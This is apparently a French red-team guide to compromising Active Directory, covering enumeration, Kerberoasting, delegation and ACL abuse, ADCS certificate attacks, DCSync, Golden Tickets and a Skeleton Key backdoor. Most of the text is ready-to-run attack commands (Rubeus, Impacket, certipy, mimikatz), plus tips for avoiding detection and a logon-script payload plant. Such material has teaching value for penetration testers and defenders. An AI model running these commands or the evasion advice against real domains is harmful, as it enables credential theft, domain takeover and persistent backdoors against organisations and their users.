Phase 1 : Énumération Active Directory

Un utilisateur de domaine standard suffit pour cartographier l'intégralité de l'AD. C'est la première chose à faire, avant tout le reste.

Collecte BloodHound

# SharpHound (collector .NET)
.\SharpHound.exe -c All --zipfilename bloodhound.zip

# BloodHound Python (depuis Linux)
bloodhound-python -u user -p '<password>' -d corp.local -ns 192.168.1.1 -c All

# Rusthound (plus rapide, écrit en Rust)
rusthound -d corp.local -u user -p '<password>' -o output.json
BloodHound CE : La nouvelle version Community Edition utilise une base Neo4j modernisée et offre de meilleures performances sur les grands environnements.

Énumération PowerView

# Import du module
Import-Module .\PowerView.ps1

# Énumération du domaine
Get-Domain
Get-DomainController

# Utilisateurs et groupes privilégiés
Get-DomainUser -AdminCount | Select-Object samaccountname
Get-DomainGroup -Identity "Domain Admins" | Get-DomainGroupMember

# Trouver les machines où l'utilisateur courant est admin local
Find-LocalAdminAccess

# GPO intéressantes
Get-DomainGPO | Where-Object { $_.displayname -like "*password*" }

Énumération LDAP manuelle

# Avec ldapsearch (Linux)
ldapsearch -x -H ldap://192.168.1.1 -D "user@corp.local" -w '<password>' \
    -b "DC=corp,DC=local" "(objectClass=user)" samAccountName

# Trouver les comptes avec SPN (cibles Kerberoasting)
ldapsearch -x -H ldap://192.168.1.1 -D "user@corp.local" -w '<password>' \
    -b "DC=corp,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" samAccountName servicePrincipalName

Phase 2 : Attaques Kerberos

Kerberos est le protocole d'authentification d'AD. Ses faiblesses de conception ouvrent plusieurs attaques dévastatrices.

Attaque MITRE ID Prérequis
Kerberoasting T1558.003 Compte domaine standard
AS-REP Roasting T1558.004 Aucun (liste d'utilisateurs)
Pass-the-Ticket T1550.003 Ticket Kerberos volé
Golden Ticket T1558.001 Hash KRBTGT
Silver Ticket T1558.002 Hash compte de service

Kerberoasting

Demander des tickets de service (TGS) pour les comptes avec SPN, puis cracker offline le hash du mot de passe.

# Avec Rubeus (Windows)
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Avec Impacket (Linux)
impacket-GetUserSPNs corp.local/user:<password> -dc-ip 192.168.1.1 -outputfile hashes.txt

# Cracking avec Hashcat
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

AS-REP Roasting

Cibler les comptes avec "Do not require Kerberos preauthentication" activé.

# Avec Impacket
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 192.168.1.1 -format hashcat

# Avec Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Cracking
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
Conseil OPSEC : Kerberoasting génère des événements 4769 (TGS request). Limiter le nombre de requêtes et espacer dans le temps pour éviter la détection.

Phase 3 : Abus de délégation Kerberos

La délégation Kerberos autorise un service à agir au nom d'un utilisateur. Mal configurée, elle offre des chemins vers Domain Admin.

Unconstrained Delegation

# Trouver les machines avec unconstrained delegation
Get-DomainComputer -Unconstrained | Select-Object dnshostname

# Extraire les tickets en cache (sur la machine compromise)
mimikatz # sekurlsa::tickets /export

# Attendre qu'un admin se connecte, puis utiliser son TGT
.\Rubeus.exe monitor /interval:5

Constrained Delegation

# Trouver les comptes avec constrained delegation
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname, msds-allowedtodelegateto

# S4U2Self + S4U2Proxy pour impersonation
.\Rubeus.exe s4u /user:svc_sql /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/dc01.corp.local /ptt

Resource-Based Constrained Delegation (RBCD)

# Si on contrôle un compte machine (ou qu'on peut en créer un)
# Et qu'on a WriteDacl sur une cible

# Créer un compte machine
impacket-addcomputer corp.local/user:<password> -computer-name 'FAKE$' -computer-pass '<machine-password>'

# Configurer RBCD sur la cible
impacket-rbcd corp.local/user:<password> -delegate-from 'FAKE$' -delegate-to 'TARGET$' -action write

# S4U attack
impacket-getST -spn cifs/target.corp.local -impersonate Administrator corp.local/'FAKE$':'<machine-password>'

Shadow Credentials

Si on a GenericWrite ou WriteProperty sur l'attribut msDS-KeyCredentialLink d'un compte, on peut lui ajouter une clé publique contrôlée par l'attaquant. On s'authentifie ensuite via PKINIT avec la clé privée correspondante, sans connaître le mot de passe du compte et sans le modifier.

# Ajouter une Shadow Credential sur un compte cible (certipy)
certipy shadow auto -u user@corp.local -p '<password>' -account target_user
# → Ajoute la clé publique dans msDS-KeyCredentialLink
# → Authentifie via PKINIT, retourne le NT hash de target_user

# Avec pywhisker (depuis Linux)
python3 pywhisker.py -d corp.local -u user -p '<password>' \
    --target target_user --action add
# → Génère un pfx + password

# Authentification avec le certificat généré
certipy auth -pfx target_user.pfx -domain corp.local
OPSEC : Modifier msDS-KeyCredentialLink génère l'Event ID 4742 (computer account changed) ou 4738 (user account changed). Certipy nettoie automatiquement la clé ajoutée avec shadow auto.

Extraction gMSA (Group Managed Service Accounts)

Les comptes gMSA ont des mots de passe rotatifs gérés par le DC. Certains groupes AD ont le droit de lire le mot de passe courant via l'attribut msDS-ManagedPassword. Un compte membre compromis donne accès au NT hash gMSA directement.

# Vérifier qui peut lire le mot de passe gMSA (BloodHound)
# Requête : (n)-[r:ReadGMSAPassword]->(m) → visualiser dans BloodHound

# Depuis Linux avec netexec
netexec ldap 192.168.1.1 -u user -p '<password>' --gmsa

# Avec gMSADumper
python3 gMSADumper.py -u user -p '<password>' -d corp.local
# → svc_account$:::<NT hash>

# Pass-the-Hash avec le NT hash gMSA
evil-winrm -i 192.168.1.10 -u 'svc_account$' -H '<NT hash>'

Phase 4 : Abus des ACLs

Les Access Control Lists mal configurées offrent des chemins d'escalade subtils mais puissants.

Droit Exploitation
GenericAll Contrôle total : reset password, ajout au groupe, etc.
GenericWrite Modifier attributs : ajouter SPN pour Kerberoast, modifier scriptPath (logon script)
WriteDacl Modifier les ACLs : s'accorder GenericAll
WriteOwner Devenir propriétaire puis modifier les ACLs
ForceChangePassword Reset le mot de passe sans connaître l'ancien
AddMember S'ajouter à un groupe privilégié 
# Avec PowerView : trouver les ACLs exploitables
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -eq "user" }

# Reset password d'un utilisateur (si ForceChangePassword)
Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString '<new-password>' -AsPlainText -Force)

# S'ajouter à un groupe privilégié (si AddMember ou GenericAll sur le groupe)
Add-DomainGroupMember -Identity "IT Admins" -Members "attacker"

# Avec bloodyAD (Linux)
bloodyAD -d corp.local -u user -p '<password>' --host 192.168.1.1 set password target_user '<new-password>'

Abus de scriptPath (GenericWrite → exécution au logon)

Si on a GenericWrite sur un compte, on peut modifier l'attribut scriptPath (logon script) pour pointer vers un partage réseau contrôlé par l'attaquant. Au prochain logon de la cible, le script s'exécute dans son contexte.

# Déposer un payload sur SYSVOL (si accès en écriture)
cp payload.ps1 \\corp.local\SYSVOL\corp.local\scripts\

# Modifier le scriptPath de la cible (GenericWrite sur l'objet user)
Set-DomainObject -Identity target_user -Set @{scriptpath='\\corp.local\SYSVOL\corp.local\scripts\payload.ps1'}

# Vérifier
Get-DomainUser -Identity target_user | Select-Object scriptpath

# Depuis Linux avec bloodyAD
bloodyAD -d corp.local -u user -p '<password>' --host 192.168.1.1 \
    set object target_user scriptPath '\\corp.local\SYSVOL\corp.local\scripts\payload.ps1'

Phase 5 : AD Certificate Services (ADCS)

ADCS est présent dans la majorité des domaines Windows d'entreprise. Ses misconfigurés offrent des chemins directs vers Domain Admin via un artefact légitime : un certificat signé par la CA.

ESC1 à ESC16 : les variantes couvrent les templates mal configurés (ESC1-ESC4), les flags CA (ESC6, ESC16), les relays NTLM vers enrollment (ESC8, ESC11) et l'absence d'extension de sécurité (ESC9, ESC16). Toutes aboutissent à certipy auth → NT hash Administrator. 
# Énumération : templates et CA vulnérables
certipy find -u user@corp.local -p '<password>' -dc-ip 192.168.1.1 -vulnerable -stdout

# ESC1 : Template avec ENROLLEE_SUPPLIES_SUBJECT → spécifier l'UPN admin
certipy req -u user@corp.local -p '<password>' -ca CORP-CA -target ca.corp.local \
    -template VulnerableTemplate -upn administrator@corp.local

# ESC4 : Write ACL sur un template → le modifier pour ESC1, exploiter, restaurer
certipy template -u user@corp.local -p '<password>' -template TargetTemplate -save-old
certipy req -u user@corp.local -p '<password>' -ca CORP-CA -target ca.corp.local \
    -template TargetTemplate -upn administrator@corp.local
certipy template -u user@corp.local -p '<password>' -template TargetTemplate \
    -configuration TargetTemplate.json   # restauration obligatoire

# ESC8 : NTLM relay vers l'endpoint HTTP enrollment (déclencher avec PetitPotam)
certipy relay -ca ca.corp.local -template DomainController

# ESC16 : Extension sécurité désactivée sur la CA → swap UPN (GenericWrite sur cible)
certipy account update -u user@corp.local -p '<password>' -user svc_account -upn administrator@corp.local
certipy req -u svc_account@corp.local -p '<svc-password>' -ca CORP-CA -template User
certipy account update -u user@corp.local -p '<password>' -user svc_account -upn svc_account@corp.local

# Dans tous les cas : authentifier et récupérer le NT hash
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.1
Référence complète : Les chaînes ESC détaillées (conditions exactes, OPSEC, detection) sont dans l'article dédié → AD Certificate Services : Cartographier et exploiter la PKI.

Phase 6 : Compromission du domaine

Une fois Domain Admin obtenu, plusieurs techniques installent la persistance.

DCSync

# Extraire tous les hashes du domaine
impacket-secretsdump corp.local/administrator:<password>@192.168.1.1

# Avec Mimikatz
mimikatz # lsadump::dcsync /domain:corp.local /all /csv

# Cibler un compte spécifique (plus discret)
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

Golden Ticket

# Créer un Golden Ticket (persistance ultime)
mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local \
    /sid:S-1-5-21-DOMAIN-SID /krbtgt:KRBTGT-HASH /ptt

# Avec Impacket
impacket-ticketer -nthash KRBTGT-HASH -domain-sid S-1-5-21-DOMAIN-SID \
    -domain corp.local FakeAdmin

Skeleton Key

# Injecter une backdoor dans LSASS du DC (mot de passe universel: mimikatz)
mimikatz # privilege::debug
mimikatz # misc::skeleton

# Tout utilisateur peut maintenant s'authentifier avec "mimikatz" comme mot de passe
Attention - Skeleton Key et DCSync sont très bruyants. Utiliser avec précaution en Red Team et documenter pour le rapport.

Connaître les indicateurs de compromission aide à simuler un adversaire réaliste.
